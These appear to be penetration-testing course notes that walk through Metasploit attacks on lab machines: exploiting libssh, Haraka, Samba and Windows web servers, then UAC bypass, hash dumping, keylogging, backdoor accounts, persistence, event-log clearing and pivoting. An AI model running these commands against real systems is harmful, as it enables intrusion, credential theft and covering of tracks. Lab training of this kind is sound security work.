* libssh is a multiplatform C library implementing the SSHv2 protocol on client and server side.
* **libssh V0.6.0-0.8.0** is vulnerable to an authentication bypass vulnerability in the libssh server code that can be exploited to execute commands on the target server.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a ssh
msf6> db_nmap -sS -sV -O 192.105.175.3

msf6> use auxiliary/scanner/ssh/libssh_auth_bypass
msf6> set spawn_pty true
msf6> run
msf6> sessions 1

# Ctrl+Z
```

Upgrade to meterpreter.

```bash
msf6> use post/multi/manage/shell_to_meterpreter
msf6> set session 1
msf6> set lhost eth1
msf6> run

meterpreter> sysinfo
```

### Linux : SMTP

* SMTP (Simple Mail Transfer Protocol) is a communication protocol that is used for the transmission of email.
* SMTP uses TCP port 25 by default. It can also be configured to run on TCP port 465 and 587.
* Haraka is an open source high performance SMTP server developed in Node.js.
* The Haraka SMTP server comes with a plugin for processing attachments. **Haraka versions prior to V2.8.9** are vulnerable to command injection.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a smtp
msf6> db_nmap -sS -sV -O 192.228.200.3
msf6> setg rhosts 192.228.200.3

msf6> use exploit/linux/smtp/haraka
msf6> setg rhost 192.228.200.3
msf6> set srvport 9898
msf6> set email_to root@attackdefense.test
msf6> set payload linux/x64/meterpreter_reverse_http
msf6> run

meterpreter> sysinfo
```

### Post exploitation

<figure><img src="../../.gitbook/assets/100.png" alt=""><figcaption></figcaption></figure>

* Post exploitation refers to the actions performed on the target system after initial access has been obtained.
* The post exploitation phase of a penetration test consists of various techniques like :
  * Local enumeration
  * Privilege escalation
  * Dumping hashes
  * Establishing persistence
  * Clearing your tracks
  * Pivoting

### Meterpreter fundamentals

* The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect.
* It communicates over a stager socket and provides an attacker with an interactive interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more.
* Meterpreter also allows us to load custom script and plugins dynamically.
* MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a meterpreter
msf6> setg rhosts 192.104.51.3
msf6> db_nmap -sV -sS -O 192.104.51.3

msf6> curl http://192.104.51.3
msf6> use exploit/unix/webapp/xoda_file_upload
msf6> set targeturi /
msf6> run

meterpreter> sysinfo
```

#### Group of commands

* Core commands
* File system commands
* Networking commands
* System commands
* Audio output commands

#### Out of session commands

| Command                    | Description                                                                 |
| -------------------------- | --------------------------------------------------------------------------- |
| `sysinfo`                  | System information.                                                         |
| `getuid`                   | User information.                                                           |
| `help`                     | Documentation.                                                              |
| `background`               | Set the session in background (Ctrl+Z).                                     |
| `exit`                     | Kill the session.                                                           |
| `sessions` `sessions -l`   | List all sessions.                                                          |
| `sessions -C sysinfo -i 1` | Execute the command `sysinfo` on `session 1` without setting it foreground. |
| `sessions 1`               | Switch to session 1.                                                        |
| `sessions -k 1`            | Kill session 1.                                                             |
| `session -n xoda -i 1`     | Rename session 1 to `xoda`.                                                 |

#### In session commands

| Command                            | Description                                                                       |
| ---------------------------------- | --------------------------------------------------------------------------------- |
| `ls`                               | List files.                                                                       |
| `pwd`                              | Current path.                                                                     |
| `cd`                               | Change directory.                                                                 |
| `mkdir`                            | Create a directory.                                                               |
| `cat`                              | Display the content of a file.                                                    |
| `edit`                             | Edit the content of a file.                                                       |
| `download`                         | Download the file into local.                                                     |
| `checksum md5`                     |                                                                                   |
| `getenv PATH`                      | Get the PATH variable.                                                            |
| `search -d /usr/bin -f *backdoor*` | Search file in `/usr/bin` folder.                                                 |
| `shell`                            | Create a shell terminal (Ctrl+C to terminate channel).                            |
| `ps`                               | Allow to display process tree (check to migrate from one process to another one). |
| `migrate 580`                      | Migrate to the process `580`.                                                     |
| `migrate -N apache2`               | Migrate to the process with the name `apache2`.                                   |
| `execute -f ifconfig`              | Create a new process.                                                             |

#### Shell to Meterpreter

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a meterpreter
msf3> setg rhosts 192.81.201.3
msf6> db_nmap -sV -sS -O 192.81.201.3

msf6> use exploit/linux/samba/is_known_pipename
msf6> run

/bin/bash -i
# Ctrl+Z
```

Upgrade shell to meterpreter.

```bash
msf6> use post/multi/manage/shell_to_meterpreter
msf6> setg lhost eth1
msf6> set session 1
msf6> run

msf6> sessions 2
```

You can do the same action with the command `sessions -u 1`.

```bash
meterpreter> sysinfo
```

### Windows post exploitation

#### Modules

* The MSF provides us with various post exploitation modules for both Windows and Linux.
* We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to :
  * Enumerate user privileges
  * Enumerate logged on users
  * VM check
  * Enumerate installed programs
  * Enumerate AVs
  * Enumerate computers connected to domain
  * Enumerate installed patches
  * Enumerate shares

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a windows_post
msf6> setg rhosts 10.3.28.69
msf6> db_nmap -sV 10.3.28.69

msf6> search rejetto
msf6> use windows/http/rejetto_hfs_exec
msf6> run

meterpreter> sysinfo
meterpreter> help
```

There are more tools since we are on a Windows OS.

| Command      | Description                             |
| ------------ | --------------------------------------- |
| `screenshot` | Take a screenshot of the screen target. |
| `getsystem`  |                                         |
| `hashdump`   | Dump all hashes from the target.        |
| `show_mount` | Display all mounted file system.        |

```bash
meterpreter> migrate 2852  # powershell.exe
# CTRL+Z
```

**Architecture migration**

```bash
msf6> use windows/manage/migrate
msf6> set session 1
msf6> run
msf6> sessions 1
meterpreter> sysinfo
# CTRL+Z
```

**Privilege enumeration**

```bash
msf6> use post/windows/gather/win_privs
msf6> set session 1
msf6> run
```

**Logged on user enumeration**

```bash
msf6> use post/windows/gather/enum_logged_on_users
msf6> set session 1
msf6> run
```

**Virtual Machine**

```bash
msf6> use post/windows/gather/checkvm
msf6> set session 1
msf6> run
```

**Installed program enumeration**

```bash
msf6> use post/windows/gather/enum_applications
msf6> set session 1
msf6> run
```

**AVs detection**

```bash
msf6> use post/windows/gather/enum_av_excluded
msf6> set session 1
msf6> run
```

**Domain computer enumeration**

```bash
msf6> use post/windows/gather/enum_computers
msf6> set session 1
msf6> run
```

**Patches enumeration**

```bash
msf6> use post/windows/gather/enum_patches
msf6> set session 1
msf6> run
```

**Shares enumeration**

```bash
msf6> use post/windows/gather/enum_shares
msf6> set session 1
msf6> run
```

**Check RDP**

```bash
msf6> use post/windows/gather/enum_shares
msf6> set session 1
msf6> run
```

#### Bypassing UAC

* User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prvent unauthorized changes from being made to the operating system.
* UAC is used to ensure that changes to the operating system require approval from the administrator.
* We can utilize the **Windows Escalate UAC Protection Bypass (In Memory Injection)** module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a uac_bypass
msf6> setg rhosts 10.3.28.181
msf6> db_nmap -sV 10.3.28.181

msf6> use exploit/windows/http/rejetto_hfs_exec
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run

meterpreter> sysinfo
meterpreter> getprivs  # not a lot of privileges
meterpreter> shell

C:> net localgroup administrators
# CTRL+C
meterpreter>
# CTRL+Z

msf6> use exploit/windows/local/bypassuac_injection
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set session 1
msf6> set lport 4445  # the port 4444 is used by session 1
msf6> set target Windows\ x64
msf6> run

meterpreter> getprivs  # more privileges aquired
meterpreter> getsystem
meterpreter> getuid    # NT AUTHORITY\SYSTEM
meterpreter> hashdump  # Administrator NTLM hash
```

#### Persistence on Windows

* Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
* Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
* We can utilize various port exploitation persistence modules to ensure that we always have access to the target system.

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a persistence
msf6> setg rhosts 10.3.24.181
msf6> use exploit/windows/http/rejetto_hfs_exec
msf6> run

meterpreter> sysinfo
# CTRL+Z

msf6> search platform:windows persistence
msf6> use exploit/windows/local/persistence_service
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> set session 1
msf6> set lport 4445
msf6> run            # Create a backdoor by crafting a background process
meterpreter> getuid  # NT AUTHORITY\SYSTEM
# CTRL+Z

msf6> sessions -K
msf6> use multi/handler
msf6> set payload windows/meterpreter/reverse_tcp
msf6> set lhost eth1
msf6> set lport 4445
msf6> run
meterpreter> getuid  # NT AUTHORITY\SYSTEM without exploit !
```

#### Enabling RDP

* RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.
* RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.

```bash
kali@kali> service postgresql start && msfconsole
msf6> workspace -a rdp
msf6> setg rhosts 10.3.22.192
msf6> db_nmap -sV 10.3.22.192

msf6> use exploit/windows/http/badblue_passthru
msf6> set target BadBlue\ EE\ 2.7\ Universal
msf6> run

meterpreter> getuid  # NT AUTHORITY\SYSTEM
# CTRL+Z

msf6> use post/windows/manage/enable_rdp
msf6> set session 1
msf6> run  # Enable RDP

msf6> db_nmap 10.3.22.192 -p 3389  # RDP is now open
```

#### Windows keylogging

* Keylogging is the process of recording or capturing the keystrokes entered on a target system.
* This technique is not limited to post exploitation, there are plenty of programs and USB devices that can be used to capture and transmit the keystrokes entered on a system.
* Meterpreter on a Windows system provides us with the ability to capture the keystrokes entered on a target system and download them back to our local system.

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a keylogging
msf6> setg rhosts 10.3.20.112
msf6> use exploit/windows/http/badblue_passthru
msf6> set target 1
msf6> run

meterpreter> keyscan_start  # start keylogging
meterpreter> keyscan_dump   # display characters
meterpreter> keyscan_stop   # stop keylogging
```

#### Clear Windows event logs

* The Windows OS stores and catalogs all actions/events performed on the system and stores them in the Windows Event Log.
* Event logs are categorized based on the type of events they store :
  * Application logs : stores application/program events like startups, crashes etc.
  * System logs : stores system events like startups, reboots etc.
  * Security logs : stores security events like password changes, authentication failures etc.
* Event logs can be accessed via the Event Viewer on Windows.
* The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a clear-event
msf6> setg rhosts 10.3.23.158
msf6> use exploit/windows/http/badblue_passthru
msf6> set target 1
msf6> run

meterpreter> shell

C:> net user administrator password_12345
# CTRL+C
```

<figure><img src="../../.gitbook/assets/101.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/102.png" alt=""><figcaption></figcaption></figure>

```bash
meterpreter> clearev  # clear all events
```

<figure><img src="../../.gitbook/assets/103.png" alt=""><figcaption></figcaption></figure>

All events get deleted !

#### Pivoting

* Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network.
* After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously.
* Meterpreter provides us with the ability to add a network route to the internal network's subnet and consequently scan and exploit other systems on the network.

<figure><img src="../../.gitbook/assets/104.png" alt=""><figcaption></figcaption></figure>

```bash
kali@kali> ping 10.3.28.166  # can reach it
kali@kali> ping 10.3.25.211  # no response
kali@kali> service postgresql start && msfconsole

msf6> workspace -a pivoting
msf6> db_nmap -sV 10.3.25.166
msf6> use exploit/windows/http/rejetto_hfs_exec
msf6> set rhosts 10.3.28.166
msf6> run

meterpreter> ipconfig
```

<figure><img src="../../.gitbook/assets/105.png" alt=""><figcaption></figcaption></figure>

```bash
# Metasploit has no gateway to hit the address 10.3.25.211 yet
meterpreter> run autoroute -p
# enable a new route for metasploit
meterpreter> run autoroute -s 10.3.28.0/20
# the gateway Session1 is now active in the Metasploit database thus you can reach this subnet by using Metasplpoit scanner modules
meterpreter> run autoroute -p
# CTRL+Z

msf6> sessions -n victim-1 -i 1
# Scan the ports on the unexposed target 2
msf6> use auxiliary/scanner/portscan/tcp
msf6> set rhosts 10.3.25.211
msf6> set ports 1-100
msf6> run
```

<figure><img src="../../.gitbook/assets/106.png" alt=""><figcaption></figcaption></figure>

```bash
# You find an open port 10.3.25.211:80 and now you must give access to the attacker by port forwarding
# Create a bound between the localhost and the unexposed machine service (port 80)
meterpreter> portfwd add -l 1234 -p 80 -r 10.3.25.211
# CTRL+Z

# The port 10.3.25.211:80 is now reachable on 127.0.0.1:1234. Scan the target 2 by the bound port forwarding
msf6> db_nmap -sV -sS -p 1234 localhost
msf6> services
```

<figure><img src="../../.gitbook/assets/107.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use exploit/windows/http/badblue_passthru
msf6> set payload windows/meterpreter/bind_tcp
msf6> set rhosts 10.3.25.211
msf6> set lport 4445
msf6> run
```

### Linux post exploitation

* The MSF provides us with various post exploitation modules for both Windows and Linux.
* We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to :
  * Enumerate system configuration
  * Enumerate environment variables
  * Enumerate network configuration
  * VM check
  * Enumerate user history

#### Modules

```bash
kali@kali> service postgresql start && msfconsole

msf6> workspace -a post-linux
msf6> setg rhosts 192.140.234.3
msf6> use exploit/linux/samba/is_known_pipename
msf6> run

/bin/bash -i
root@victim-1> id  # root
```

```bash
msf6> use post/linux/gather/enum_configs
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/108.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/multi/gather/env
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/109.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/linux/gather/enum_network
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/110.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/linux/gather/enum_protections
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/111.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/linux/gather/enum_system
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/112.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/linux/gather/checkcontainer
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/113.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/linux/gather/checkvm
msf6> set session 2
msf6> run
```

<figure><img src="../../.gitbook/assets/114.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> use post/linux/gather/enum_users_history
msf6> set session 2
msf6> run
```

#### Exploit a vulnerable program

* The privilege techniques we can utilize will depend on the version of the Linux kernel running on the target system as well as the distribution release version.
* MSF offers very little in regards to Linux kernel exploit modules, however, in some cases, there may be an exploit module that can be utilized to exploit a vulnerable service or program in order to elevate our privileges.

```bash
kali@kali> service postgresql start && msfconsole

msf6> db_nmap -sV 192.167.22.3
msf6> 
msf6> ssh jackie@192.167.22.3  # jackie:password

/bin/bash -i
jackie@victim-1> id
# CTRL+Z

msf6> sessions -u 1
msf6> sessions 2

/bin/bash
jackie@victim-1> ps aux
jackie@victim-1> cat /bin/check-down
# CTRL+Z
```

<figure><img src="../../.gitbook/assets/115.png" alt=""><figcaption></figcaption></figure>

```bash
msf6> search chkrootkit
msf6> use exploit/unix/local/chkrootkit
msf6> set session 2
msf6> set lhost 192.167.22.2
msf6> set chkrootkit /bin/chkrootkit
msf6> run  # it can take 2 minutes

/bin/bash -i
root@victim-1> id  # root
```

#### Dump hashes with Hashdump

* We can dump Linux user hashes with the hashdump post exploitation module.
* Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.
* The hashdump module can be used to dump the user account hashes from the `/etc/shadow` file and can also be used to unshadow the hashes for password cracking with **John The Ripper**.

```bash
kali@kali> service postgresql start && msfconsole

msf6> db_nmap -sV 192.197.141.3
msf6> use exploit/linux/samba/is_known_pipename
msf6> run
meterpreter> sysinfo
# CTRL+Z

msf6> sessions -u 1
msf6> sessions 2

msf6> use post/linux/gather/hashdump
msf6> set session 2
msf6> run
msf6> loot
```

#### Establishing persistence

* Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
* Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.
* The persistence techniques we can utilize will depend on the target configuration.
* We can utilize various post exploitation persistence modules to ensure that we always have aaccess to the target system.

```bash
kali@kali> service postgresql start && msfconsole

msf6> setg rhosts 192.163.200.3
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> set username jackie
msf6> set password password
msf6> run
# CTRL+Z

msf6> sessions -u 1
msf6> use exploit/unix/local/chkrootkit
msf6> set session 2
msf6> set chkrootkit /bin/chkrootkit
msf6> set lhost 192.163.200.2
msf6> run
# CTRL+Z

msf6> sessions -u 3
msf6> sessions 4
```

Manual backdoor.

```bash
meterpreter> shell
/bin/bash -i
root@victim-1> useadd -m ftp -s /bin/bash
root@victim-1> passwd ftp  # password1234
root@victim-1> usermod -aG root ftp
root@victim-1> usermod -u 15 ftp
# CTRL+C
```

Backdoor modules :

* exploit/linux/local/apt\_package\_manager\_persistence
* exploit/linux/local/autostart\_persistence
* exploit/linux/local/bash\_profile\_persistence
* exploit/linux/local/cron\_persistence
* exploit/linux/local/rc\_local\_persistence
* exploit/linux/local/service\_persistence
* post/linux/manage/sshkey\_persistence
* exploit/linux/local/yum\_package\_manager\_persistence

```bash
msf6> use post/linux/manage/sshkey_persistence
msf6> set createsshfolder true
msf6> run

msf6> loot
msf6> cat /root/.msf4/loot/20230803140026_linuxpersistenc_192.163.200.3_id_rsa_226018.txt
```

Copy/paste the private SSH key in the attacker host and connect it through SSH.

### Armitage

* Armitage is a free Java based GUI front-end for the Metasploit Framework developed by Raphael Mudge and is used to simplify network discovery, exploitation and post exploitation.
* Armitage provides you with the following functionality :
  * Visualize targets
  * Automate port scanning
  * Automate exploitation
  * Automate post exploitation
* Armitage requires the MSF database and the Metasploit backend services to be enabled and running in order to function correctly.
* Armitage comes pre-packaged with Kali Linux and other penetration testing distribution.
